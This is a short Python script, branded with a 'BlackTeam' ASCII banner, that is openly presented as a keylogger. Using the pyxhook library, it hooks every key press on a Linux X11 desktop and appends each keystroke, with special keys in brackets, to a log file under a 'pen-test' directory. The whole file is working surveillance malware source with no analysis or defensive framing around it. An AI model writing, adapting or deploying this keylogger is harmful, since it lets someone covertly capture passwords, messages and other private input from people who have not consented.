#!/usr/bin/env python
import pyxhook

class colors:
        def __init__(self):
                self.blue = "\033[94m"
                self.red = "\033[91m"
                self.end = "\033[0m"
cl = colors()




print(cl.blue+"""
	*--------------------------------------*
	|       programmed by : Abdessmad      |
	|               BlackTeam              |
	*--------------------------------------*
     ____  _            _    _____                    
    | __ )| | __ _  ___| | _|_   _|__  __ _ _ __ ___  
    |  _ \| |/ _` |/ __| |/ / | |/ _ \/ _` | '_ ` _ \ 
    | |_) | | (_| | (__|   <  | |  __/ (_| | | | | | |
    |____/|_|\__,_|\___|_|\_\ |_|\___|\__,_|_| |_| |_|
 
	
	               Keylogger
	              -----------

"""+cl.end)


log_file='/home/pen-test/txt_files/file.log'

def keypress(event):
	log=open(log_file,'a')
	if event.Key == 'space':
		log.write(' ')
	elif event.Key == 'Return':
		log.write('\n')
	elif len(event.Key) != 1:
		log.write('[ '+event.Key+' ]')
	else:
		log.write(event.Key)

key=pyxhook.HookManager()
key.KeyDown=keypress
key.HookKeyboard()
key.start()
